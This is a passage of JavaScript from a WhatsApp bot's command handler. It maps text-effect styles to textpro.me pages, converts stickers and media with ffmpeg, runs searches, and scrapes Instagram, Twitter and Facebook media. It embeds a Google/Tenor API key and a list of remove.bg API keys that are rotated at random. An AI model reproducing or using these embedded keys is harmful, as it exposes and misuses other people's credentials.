            else if (/underwater/.test(args[0])) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
            else if (/graffitibike/.test(args[0])) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
            else if (/snow/.test(args[0])) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
            else if (/cloud/.test(args[0])) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
            else if (/honey/.test(args[0])) link = 'https://textpro.me/honey-text-effect-868.html'
            else if (/ice/.test(args[0])) link = 'https://textpro.me/ice-cold-text-effect-862.html'
            else if (/fruitjuice/.test(args[0])) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
            else if (/biscuit/.test(args[0])) link = 'https://textpro.me/biscuit-text-effect-858.html'
            else if (/wood/.test(args[0])) link = 'https://textpro.me/wood-text-effect-856.html'
            else if (/chocolate/.test(args[0])) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
            else if (/strawberry/.test(args[0])) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
            else if (/matrix/.test(args[0])) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
            else if (/blood/.test(args[0])) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
            else if (/dropwater/.test(args[0])) link = 'https://textpro.me/dropwater-text-effect-872.html'
            else if (/toxic/.test(args[0])) link = 'https://textpro.me/toxic-text-effect-online-901.html'
            else if (/lava/.test(args[0])) link = 'https://textpro.me/lava-text-effect-online-914.html'
            else if (/rock/.test(args[0])) link = 'https://textpro.me/rock-text-effect-online-915.html'
            else if (/bloodglas/.test(args[0])) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
            else if (/halloween/.test(args[0])) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
            else if (/darkgold/.test(args[0])) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
            else if (/joker/.test(args[0])) link = 'https://textpro.me/create-logo-joker-online-934.html'
            else if (/wicker/.test(args[0])) link = 'https://textpro.me/wicker-text-effect-online-932.html'
            else if (/firework/.test(args[0])) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
            else if (/skeleton/.test(args[0])) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
            else if (/blackpink/.test(args[0])) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
            else if (/sand/.test(args[0])) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
            else if (/glue/.test(args[0])) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
            else if (/1917/.test(args[0])) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
            else if (/leaves/.test(args[0])) link = 'https://textpro.me/natural-leaves-text-effect-931.html'           
            else if (/whitebear/.test(args[0])) link = 'https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html'
            else if (/thunder2/.test(args[0])) link = 'https://textpro.me/create-thunder-text-effect-online-881.html'
            else if (/sand/.test(args[0])) link = 'https://textpro.me/sand-writing-text-effect-online-990.html'
            else if (/metallic/.test(args[0])) link = 'https://textpro.me/create-a-metallic-text-effect-free-online-1041.html'
            else if (/steel/.test(args[0])) link = 'https://textpro.me/steel-text-effect-online-921.html'
            else if (/luxury/.test(args[0])) link = 'https://textpro.me/3d-luxury-gold-text-effect-online-1003.html'
            else if (/fabric/.test(args[0])) link = 'https://textpro.me/fabric-text-effect-online-964.html'
            else if (/neonlight/.test(args[0])) link = 'https://textpro.me/neon-light-glitch-text-generator-online-1063.html'
            else if (/ancient/.test(args[0])) link = 'https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html'
            else if (/classic/.test(args[0])) link = 'https://textpro.me/video-game-classic-8-bit-text-effect-1037.html'
            else if (/halloween2/.test(args[0])) link = 'https://textpro.me/create-a-spooky-halloween-text-effect-online-1046.html'
            else if (/marvel/.test(args[0])) link = 'https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html'
            else if (/collwall/.test(args[0])) link = 'https://textpro.me/create-cool-wall-graffiti-text-effect-online-1009.html'
            else if (/batman/.test(args[0])) link = 'https://textpro.me/make-a-batman-logo-online-free-1066.html'
            else if (/3dbox/.test(args[0])) link = 'https://textpro.me/3d-box-text-effect-online-880.html'
            else if (/lion2/.test(args[0])) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
            else if (/3dstone/.test(args[0])) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
            else if (/3davengers/.test(args[0])) link = 'https://textpro.me/create-3d-avengers-logo-online-974.html'
            else if (/window/.test(args[0])) link = 'https://textpro.me/write-text-on-foggy-window-online-free-1015.html'
            else if (/blackpinkneon/.test(args[0])) link = 'https://textpro.me/create-neon-light-blackpink-logo-text-effect-online-1081.html'
            else if (/neon/.test(args[0])) link = 'https://textpro.me/neon-text-effect-online-879.html'
            else if (/greenneon/.test(args[0])) link = 'https://textpro.me/green-neon-text-effect-874.html'
            else if (/bokeh/.test(args[0])) link = 'https://textpro.me/bokeh-text-effect-876.html'
            else if (/holographic/.test(args[0])) link = 'https://textpro.me/holographic-3d-text-effect-975.html'
            else if (/summertime/.test(args[0])) link = 'https://textpro.me/create-a-summer-neon-light-text-effect-online-1076.html'
            else if (/neonlight2/.test(args[0])) link = 'https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html'
            else if (/thewall/.test(args[0])) link = 'https://textpro.me/break-wall-text-effect-871.html'
            else if (/carbon/.test(args[0])) link = 'https://textpro.me/carbon-text-effect-833.html'
            else if (/glow/.test(args[0])) link = 'https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html'
            else replyErr(`Estilo desconocido!`)
            // if (/glitch3/.test(args[0])) link = 'https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html'
            // else if (/graffiti/.test(args[0])) link = 'https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html'
            // else if (/pornhub2/.test(args[0])) link = 'https://textpro.me/pornhub-style-logo-online-generator-free-977.html'
            // else if (/glitch2/.test(args[0])) link = 'https://textpro.me/create-a-glitch-text-effect-online-free-1026.html'
            // else if (/3dspace/.test(args[0])) link = 'https://textpro.me/create-space-3d-text-effect-online-985.html'
            // else if (/wolf/.test(args[0])) link = 'https://textpro.me/create-wolf-logo-galaxy-online-936.html'
            // else replyErr(`Example : ${prefix + command} ${global.ownername}|${global.ownername}`)
             let anu = await maker.textpro(link, args[1])
                SkyzeeBOT.sendMessage(m.chat, { image: { url: anu }, caption: `Made by ${global.botname}` }, { quoted: m })
             }
             break
case 'emoji': {
if (!args.join(" ")) return reply('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await SkyzeeBOT.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await SkyzeeBOT.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break

case 'igemoji': case 'instagramemoji': case 'iphoneemoji': case 'googleemoji': case 'samsungemoji': case 'microsoftemoji': case 'whatsappemoji': case 'twitteremoji': case 'facebookemoji':  case 'fbemoji': case 'skypeemoji': case 'joyemoji': case 'mojiemoji': case 'pediaemoji': 
if (!q) return reply("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
if (/igemoji/.test(command) || /instagramemoji/.test(command)) dua = "11"
else if (/iphoneemoji/.test(command)) dua = "0"
else if (/googleemoji/.test(command)) dua = "1"
else if (/samsungemoji/.test(command)) dua = "2"
else if (/microsoftemoji/.test(command)) dua = "3"
else if (/whatsappemoji/.test(command)) dua = "4"
else if (/twitteremoji/.test(command)) dua = "5"
else if (/facebookemoji/.test(command) || /fbemoji/.test(command)) dua = "6"
else if (/skypeemoji/.test(command)) dua = "7"
else if (/joyemoji/.test(command)) dua = "8"
else if (/mojiemoji/.test(command)) dua = "9"
else if (/pediaemoji/.test(command)) dua = "10"
try {
    emoji = new EmojiAPI();
    emoji.get(q).then(emoji => {
        msg = {
            image: { url: emoji.images[dua].url },
            caption: q,
            footerText: `${botname}`,
            headerType: 4
        }
        SkyzeeBOT.sendMessage(from, msg, { quoted:m })
    })
} catch (e) {
    replyerr(e)
}
break

case 'emojimix': {
if (!q) reply(`*Example :* ${prefix + command} 🦄+🤣`)
let [emoji1, emoji2] = q.split`+`
let kuntuh = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of kuntuh.results) {
let encmedia = await SkyzeeBOT.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
	case 'toimage': case 'toimg': {
if (!m.quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
let media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
SkyzeeBOT.sendMessage(m.chat, { image: buffer }, { quoted: m})
fs.unlinkSync(ran)
})
}
break
case 'tomp4': case 'tovideo': {
if (!m.quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
let { webp2mp4File } = require('./lib/uploader')
let media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await SkyzeeBOT.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Converted From Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want To Use As Audio With Caption ${prefix + command}`)
if (!m.quoted) return reply(`Send/Reply Video/Audio You Want To Use As Audio With Caption ${prefix + command}`)
reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
SkyzeeBOT.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
case 'tomp3': {
if (/document/.test(mime)) return reply(`Send/Reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
if (!m.quoted) return reply(`Send/Reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
SkyzeeBOT.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Converted By ${SkyzeeBOT.user.name} (${m.id}).mp3`}, { quoted : m })
}
break
case 'tovn': case 'toptt': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
if (!m.quoted) return reply(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
reply(mess.wait)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
SkyzeeBOT.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
case 'togif': {
if (!m.quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
let { webp2mp4File } = require('./lib/uploader')
let media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await SkyzeeBOT.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Converted From Webp To Gif' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
}
break
	case 'tourl': {
reply(mess.wait)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
            case 'imagenobgxxx': case 'removebgxxx': case 'remove-bgxxx': {
	    if (!quoted) return replay(`Send/Reply Image With Caption ${prefix + command}`)
	    if (!/image/.test(mime)) return replay(`Send/Reply Image With Caption ${prefix + command}`)
	    if (/webp/.test(mime)) return replay(`Send/Reply Image With Caption ${prefix + command}`)
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    SkyzeeBOT.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	case 'yts': case 'ytsearch': {
if (!args.join(" ")) return replay(`Example : ${prefix + command} stay jb`)
let yts = require("yt-search")
let search = await yts(args.join(" "))
let teks = '*| YOUTUBE SEARCH |*\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `${global.themeemoji} No : ${no++}\n${global.themeemoji} Type : ${i.type}\n${global.themeemoji} Video ID : ${i.videoId}\n${global.themeemoji} Title : ${i.title}\n${global.themeemoji} Views : ${i.views}\n${global.themeemoji} Duration : ${i.timestamp}\n${global.themeemoji} Uploaded : ${i.ago}\n${global.themeemoji} Author : ${i.author.name}\n${global.themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
}
SkyzeeBOT.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break
case 'google': {
if (!args[0]) return reply(`Example: ${prefix + command} <query>\nUses : ${prefix + command} apa arti cinta`)
let google = require('google-it')
google({'query': args.join(" ")}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `${global.themeemoji} *Title* : ${g.title}\n`
teks += `${global.themeemoji} *Description* : ${g.snippet}\n`
teks += `${global.themeemoji} *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break
case 'gimage': case 'googleimage': {
if (!args[0]) return reply("What picture are you looking for??")
let gis = require('g-i-s')
gis(args.join(" "), async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
{buttonId: `${prefix}gimage ${args.join(" ")}`, buttonText: {displayText: 'Next Image 👀'}, type: 1}
]
let buttonMessage = {
image: { url: images },
caption: `s`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:`${global.ownername}`,
body:`${global.watermark}`,
thumbnail: log0,
mediaType:1,
mediaUrl: `${global.websitex}`,
sourceUrl: `${global.websitex}`
}}
}
if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break
	case 'igstoryxx': case 'instagramstoryxx': {
   if (isBan) return replywarn(mess.ban)	 			
if (isBanChat) return replywarn(mess.ban)
if (!args[0]) return reply(`Example :\n${prefix + command} josephxeon13`)
try {
hx.igstory(args[0]).then(async(resed) => {
ini_anu = []
anu_list = []
textbv = `*| INSTAGRAM STORY |*\n\n${global.themeemoji} Username : ${resed.user.username ? resed.user.name : "undefined"}\n${global.themeemoji} Followers : ${resed.user.followers}`
urut = 1
for (let i = 0; i < resed.medias.length; i++) {
ini_anu.push({
 "type": resed.medias[i].fileType,
 "url": resed.medias[i].url
})
}
ilod = 1
for (let i of ini_anu) {
anu_list.push({buttonId: `${prefa}ig ${i.type} ${i.url}`, buttonText: {displayText: `Media ${ilod++}`}, type: 1})
}
textbv += `\n\n_Select the media below to download_`
let buttons = anu_list
let buttonMessage = {
image:log0,
jpegThumbnail:thum,
caption: textbv,
footer: `${global.botname}`,
buttons: buttons,
headerType: 4
}
SkyzeeBOT.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (err) {
reply(String(err))
}
}
break
case 'igs2': case 'igstory2': case 'instagramstory2': {
if (isBan) return replywarn(mess.ban)
	if (isBanChat) return replywarn(mess.ban)
                if (!text) return reply(`Where is the username?\nExample: ${prefix}igstory josephxeon13`)
                let urlnya = text.split(" ")[1]
	            hx.igstory(urlnya)
	            .then(async(data) => {
		        var halo = 0
	            SkyzeeBOT.sendMessage(m.chat, { image: { url: data.user.profilePicUrl }, jpegThumbnail: await getBuffer(data.user.profilePicUrl), caption: `*----「 INSTAGRAM STORY 」----*\n\n*${themeemoji} Username :* ${data.user.username}\n*${themeemoji} Fullname :* ${data.user.fullName}\n*${themeemoji} Followers :* ${data.user.followers}\n*${themeemoji} Following :* ${data.user.following}\n*${themeemoji} ID :* ${data.user.id}\n*${themeemoji} Filetype :* ${data.medias[0].fileType}\n*${themeemoji} Type :* ${data.medias[0].type}\n*${themeemoji} Media :* ${data.medias.length}\n*${themeemoji} Bio :* ${data.user.biography}\n\n*${botname}*` }, { quoted: m })	                                  	                      	            
		        for(let i of data) {
			    if(i.url.includes('mp4')){
				let link = await getBuffer(i.url)
                SkyzeeBOT.sendMessage(m.chat, { video: link, jpegThumbnail: await getBuffer(i.preview), caption: `*Story ${i.type}*` }, { quoted: m }) 
                } else {
                    let link = await getBuffer(i.url)
                  SkyzeeBOT.sendMessage(m.chat, { image: link, jpegThumbnail: await getBuffer(i.preview), caption: `*Story ${i.type}*` }, { quoted: m })                  
                }
            }
            }).catch((err) => reply(err))
            }	
			break
            case 'igs2': case 'igstory2': case 'instagramstory2': {
    if (!q) return reply(`Where is the link boss?`)
    instagramStoryv2(`${q}`).then(async (results) => {            
        var buf = await getBuffer(results.thumbnail)        
        SkyzeeBOT.sendMessage(m.chat, { video: { url: results.url }, jpegThumbnail:buf, caption: `${botname}`}, { quoted: m })
    }).catch((err) => {
        reply(err)
    })
} break
case 'ig2': case 'igdl2': case 'instagram2': {
               if (isBan) return replywarn(mess.ban)
	if (isBanChat) return replywarn(mess.ban)
                if (!q) return reply(`Where is the link bro`)
                if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(`The link you provided is not a instagram link`)             
                let urlnya = text
	            hx.igdl(urlnya)
	            .then(async(result) => {	  
	            var halo = 0		
	            SkyzeeBOT.sendMessage(m.chat, { image: { url: result.user.profilePicUrl }, jpegThumbnail: await getBuffer(result.user.profilePicUrl), caption: `*----「 INSTAGRAM DOWNLOADER 」----*\n\n*${themeemoji} Username :* ${result.user.username}\n*${themeemoji} Fullname :* ${result.user.fullName}\n*${themeemoji} Followers :* ${result.user.followers}\n*${themeemoji} Following :* ${result.user.following}\n*${themeemoji} ID :* ${result.user.id}\n*${themeemoji} Filetype :* ${result.medias[0].fileType}\n*${themeemoji} Type :* ${result.medias[0].type}\n*${themeemoji} Jumlah Media :* ${result.medias.length}\n*${themeemoji} Url :* ${text}\n\n*${botname}*` }, { quoted: m })	                                  	                      	            
		        for(let i of result.medias) {		
		        if(i.url.includes('mp4')){		           			    				
				let link = await getBuffer(i.url)
                SkyzeeBOT.sendMessage(m.chat, { video: link, jpegThumbnail: await getBuffer(i.preview), caption: `*Instagram ${i.type}*` }, { quoted: m })
                } else {
                let link = await getBuffer(i.url)
                SkyzeeBOT.sendMessage(m.chat, { image: link, jpegThumbnail: await getBuffer(i.preview), caption: `*Instagram ${i.type}*` }, { quoted: m })                      
               }
              }
            }).catch((err) => reply(mess.error))
            }		
			break
case 'igdl': case 'instagram': case 'instagramreels': case 'igreels': {
   if (isBan) return replywarn(mess.ban)	 			
if (isBanChat) return replywarn(mess.ban)
if (!args[0]) return reply(`Example :\n${prefix + command} https://www.instagram.com/p/CcvJGuxh9VI/?igshid=YmMyMTA2M2Y=`)
    hx.igdl(args[0]).then(async(result) => {
    ini_anu = []
    anu_list = []
    textbv = `*| INSTAGRAM DOWNLOADER |*`
    urut = 1
    for (let i = 0; i < result.length; i++) {
    ini_anu.push({
     "type": result[i].fileType,
     "url": result[i].url
    })
    }
    ilod = 1
    for (let i of ini_anu) {
    anu_list.push({buttonId: `${prefix}ig ${i.type} ${i.url}`, buttonText: {displayText: `Media ${ilod++}`}, type: 1})
    }
    textbv += `\n\n_Select the media below to download_`
    let buttons = [
    {buttonId: `${prefix}fbddl`, buttonText: {displayText: 'QualityHD'}, type: 1}
    ]
    let buttonMessage = {
    image:log0,
    jpegThumbnail:thum,
    caption: textbv,
    footer: `${global.botname}`,
    buttons: buttons,
    headerType: 4
    }
    SkyzeeBOT.sendMessage(from, buttonMessage, {quoted:m})
    }).catch((err) => reply(err))
} break
case 'ig': {
if (args[0] === "mp4") {
SkyzeeBOT.sendMessage(from, {video:{url:args[1]}, caption:'Done!', mimetype:'video/mp4'}, {quoted:m})
} else if (args[0] === "jpg") {
SkyzeeBOT.sendMessage(from, {image:{url:args[1]}, caption:'Done!'}, {quoted:m})
} else {
reply("Error! ")
}
}
break
case 'mp4' : {
if (!q) return reply(`Where's the link ?`)
try {
SkyzeeBOT.sendMessage(from, {video:{url:q}, caption:"Succes", contextInfo:{externalAdReply:{
title:`${global.botname}`,
body:`${global.ownername}`,
thumbnail: log0,
mediaType:2,
mediaUrl: `${global.websitex}`,
sourceUrl: `${global.websitex}`
}}}, {quoted:m})
} catch {
reply("Link error!")
}
}
break
case 'jpeg': {
if (!args[0]) return reply(`Where's the link?`)
try {
SkyzeeBOT.sendMessage(from, {image:{url:args[0]}, caption:"Success", contextInfo:{externalAdReply:{
title:`${global.botname}`,
body:`${global.ownername}`,
thumbnail: log0,
mediaType:2,
mediaUrl: `${global.websitex}`,
sourceUrl: `${global.websitex}`
}}}, {quoted:m})
} catch {
reply("Link error")
}
}
break
case 'igtv': {
                if (!q) return reply(`Where is the link boss?`)
                if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply('*The link you provided is not valid*')
                instagramdlv3(`${q}`).then(async (result) => {            
                var buf = await getBuffer(result[0].thumbnail)        
                SkyzeeBOT.sendMessage(m.chat, { video: { url: result[0].url }, jpegThumbnail:buf, caption: `${botname}`}, { quoted: m })
                }).catch((err) => {
                    reply(mess.error)
                })
            }
            break
            case 'twitter': case 'td': case 'twitterdl': {     
   if (isBan) return replywarn(mess.ban)	 			
if (isBanChat) return replywarn(mess.ban)	             
             if (!q) return reply(`Where is the link?`)
                if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(`The link you provided is not valid`)
                xeonkey.Twitter(`${q}`).then(async (data) => {                    
                    let txt = `*TWITTER DOWNLOADER*\n\n`
                    txt += `*${themeemoji}TITLE :* ${data.title}\n`
                    txt += `*${themeemoji}QUALITY :* ${data.medias[1].quality}\n`
                    txt += `*${themeemoji}TYPE :* ${data.medias[1].extension}\n`
                    txt += `*${themeemoji}SIZE :* ${data.medias[1].formattedSize}\n`
                    txt += `*${themeemoji}DURATION :* ${data.medias.length}\n`
                    txt += `*${themeemoji}URL :* ${data.url}\n\n`
                    txt += `*${botname}*`
                buf = await getBuffer(data.thumbnail)    
                SkyzeeBOT.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m })
                for (let i of data.medias) {
                SkyzeeBOT.sendMessage(m.chat, { video: { url: i.url }, jpegThumbnail:buf, caption: `*${q}*`}, { quoted: m })
                }
                }).catch((err) => {
                    reply(mess.error)
                })
            }
            break
            case 'twittermp3': case 'twitteraudio': { 
   if (isBan) return replywarn(mess.ban)	 			
if (isBanChat) return replywarn(mess.ban)	             
             if (!text) return reply(`Where is the link?`)
                if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(`*The link you provided is not valid*`)
                xeonkey.Twitter(`${text}`).then(async (data) => {
                SkyzeeBOT.sendMessage(m.chat, { audio: { url: data.medias[1].url }, mimetype: 'audio/mp4'}, { quoted: m })
                }).catch((err) => {
                    reply(mess.reply)
                })
            }
            break
case 'twitterxx': case 'twdlxx': case 'twmp4xx': {
   if (isBan) return replywarn(mess.ban)	 			
if (isBanChat) return replywarn(mess.ban)
if (!args[0]) return reply(`Example :\n${prefix + command} https://twitter.com/cinema21/status/1517754155644821504?t=rUnbyqwh4vAE1QXMXlsVeQ&s=19`)
try {
let lotwit = await aiovideodl(args[0])
teks = `*| TWITTER DOWNLOADER |*

Caption : ${lotwit.title ? lotwit.title : "undefined"}
Type : ${lotwit.medias[1].extension}
Size : ${lotwit.medias[1].formattedSize}
Link : ${lotwit.medias[1].url}

_Choose the video quality below by clicking the button_`
let buttons = [
{buttonId: `${prefa}twddl ${lotwit.medias[0].url}`, buttonText: {displayText: `Quality ${lotwit.medias[0].quality}`}, type: 1},
{buttonId: `${prefa}twddl ${lotwit.medias[2].url}`, buttonText: {displayText: `Quality ${lotwit.medias[2].quality}`}, type: 1}
]
let buttonMessage = {
video: {url:lotwit.medias[1].url},
caption: teks,
footer: `${pushname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:`${global.botname}`,
body:lotwit.title ? lotwit.title : "Twitter Downloader",
thumbnail: log0,
mediaType:1,
mediaUrl: args[0],
sourceUrl: args[0]
}}
}
SkyzeeBOT.sendMessage(from, buttonMessage, {quoted:m})
} catch {
reply("Error link!")
}
}
break
case 'twddlxx': {
try {
    let msg = {
    video: {url:args[0]},
    caption: "Done!",
    footer: `${pushname}`,
    headerType: 4,
    contextInfo:{externalAdReply:{
    title:`${global.botname}`,
    body: "Twitter Downloader",
    thumbnail: log0,
    mediaType:1,
    mediaUrl: args[0],
    sourceUrl: args[0]
    }}
    }
    SkyzeeBOT.sendMessage(from, msg, {quoted:m})
} catch {
    reply(mess.error)
}
}
break
case 'fbdl': case 'fb': case 'facebook': case 'fbmp4': {
             if (!q) return reply(`Where is the link bro?\nExample: ${prefix}facebook https://www.facebook.com/groups/599913174599515/permalink/705467384044093/`)
                if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(`The link you provided is not valid`)
            let bocil = require('@bochilteam/scraper')  
                bocil.facebookdlv2(`${q}`).then(async (data) => {                   
                    let txt = `*FB DOWNLOADER*\n\n`
                    txt += `*${themeemoji}TITLE :* ${data.title}\n`
                    txt += `*${themeemoji}QUALITY :* ${data.result[0].quality}\n`
                    txt += `*${themeemoji}DESCRIPTION :* ${data.description}\n`
                    txt += `*${themeemoji}URL :* ${q}\n\n`
                buf = await getBuffer(data.thumbnail)    
                SkyzeeBOT.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m })         
                SkyzeeBOT.sendMessage(m.chat, { video: { url: data.result[0].url }, jpegThumbnail:buf, caption: `*${themeemoji} Quality :* ${data.result[0].quality}`}, { quoted: m })
                }).catch((err) => {
                    reply(err)
                })
            }
            break
            case 'fbmp3': case 'facebookmp3': case 'facebookaudio': {
                  if (!text) return reply(`Where is the link?\nExample: ${prefix + command} https://www.facebook.com/groups/599913174599515/permalink/705467384044093/`)
                  if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(`The link you provided is not valid`)
  let noh = require('@bochilteam/scraper')                
  noh.savefrom(`${text}`).then(async (anu) => {  
  SkyzeeBOT.sendMessage(m.chat, { audio: { url: anu.url[0].url }, mimetype: 'audio/mp4' }, { quoted: m })      
                }).catch((err) => {
                    reply(mess.error)
                })
            }
            break
// case 'facebookxx': case 'fbdlxxx': case 'fbmp4xxx': case 'fbxxx': {
// if (!args[0]) return reply(`Example :\n${prefix + command} https://fb.watch/cAX2dep-BZ/`)
// try {
// let resd = await aiovideodl(args[0])
// teks = `*| FACEBOOK DOWNLOADER |*

// Type : video/${resd.medias[0].extension}
// Quality : ${resd.medias[0].quality}
// Size : ${resd.medias[0].formattedSize}

// _For HD quality you can click the button below_`
// let buttons = [
// {buttonId: `${prefix}fbddl ${resd.medias[1].url}`, buttonText: {displayText: 'QualityHD'}, type: 1}
// ]
// let buttonMessage = {
// video: {url:resd.medias[0].url},
// caption: teks,
// footer: `${pushname}`,
// buttons: buttons,
// headerType: 4,
// contextInfo:{externalAdReply:{
// title:`${global.botname}`,
// body:"Facebook Downloader",
// thumbnail: log0,
// mediaType:1,
// mediaUrl: args[0],
// sourceUrl: args[0]
// }}
// }
// if (notButtons || from.includes("@s.whatsapp.net")) {
//     teks += `\n\n_${prefix}fbddl ${resd.medias[1].url}_ to show media`
//     delete buttonMessage.buttons
// }
// SkyzeeBOT.sendMessage(from, buttonMessage, {quoted:m})
// } catch (err) {
// reply(err)
// }
// }
// break
// case 'fbddlxx': {
// let msg = {
// video: {url:args[0]},
// caption: "Done!",
// footer: `${pushname}`,
// headerType: 4,
// contextInfo:{externalAdReply:{
// title:`${global.botname}`,
// body: "Facebook Downloader",
// thumbnail: log0,
// mediaType:1,
// mediaUrl: args[0],
// sourceUrl: args[0]
// }}
// }
// SkyzeeBOT.sendMessage(from, msg, {quoted:m})
// }
// break
            case 'pinterest2': {
                reply(mess.wait)
